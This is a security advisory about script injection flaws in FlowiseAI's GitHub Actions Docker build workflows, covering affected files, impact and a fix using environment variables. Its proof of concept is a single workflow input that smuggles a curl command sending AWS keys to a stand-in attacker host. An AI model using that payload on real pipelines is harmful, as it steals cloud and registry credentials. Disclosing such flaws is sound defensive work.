repo.description:
### Summary

8 script injection vulnerabilities across 3 Docker image build workflows allow a user with write access to steal AWS credentials and Docker Hub tokens by injecting shell commands through workflow_dispatch inputs.

### Details

The following workflow_dispatch inputs are interpolated directly into `run:` blocks using `${{ }}` syntax, which GitHub expands before the shell executes. This allows shell metacharacters in the input to break out of the intended context and run arbitrary commands.

**FlowiseAI/Flowise:**
- [docker-image-dockerhub.yml lines 26-27](https://github.com/FlowiseAI/Flowise/blob/main/.github/workflows/docker-image-dockerhub.yml#L26) - `node_version`, `tag_version` (secrets: DOCKERHUB_TOKEN)
- [docker-image-ecr.yml lines 39-40](https://github.com/FlowiseAI/Flowise/blob/main/.github/workflows/docker-image-ecr.yml#L39) - `node_version`, `tag_version` (secrets: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)

**FlowiseAI/FlowiseTestBullMQ:**
- [docker-image.yml lines 51-54](https://github.com/FlowiseAI/FlowiseTestBullMQ/blob/main/.github/workflows/docker-image.yml#L51) - `registry`, `image_type`, `node_version`, `tag_version` (secrets: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DOCKERHUB_TOKEN)

### PoC

A user with write access triggers the workflow via workflow_dispatch with a crafted input:

**tag_version**: `latest"; curl https://attacker.com?k=$AWS_ACCESS_KEY_ID&s=$AWS_SECRET_ACCESS_KEY; echo "`

This breaks the shell quoting, executes the curl command with the AWS credentials, and the attacker receives them.

### Impact

A compromised contributor account or malicious insider can steal:
- AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY (ECR access, infrastructure)
- DOCKERHUB_TOKEN (push malicious Docker images)
- AWS_OIDC_IAM_ROLE (assume cloud IAM role)

### Fix

Pass inputs through environment variables instead of direct interpolation:

```yaml
- env:
    TAG_VERSION: ${{ github.event.inputs.tag_version || 'latest' }}
  run: echo "$TAG_VERSION"
repo.summary: Script injection in Docker image build workflows allows secret theft
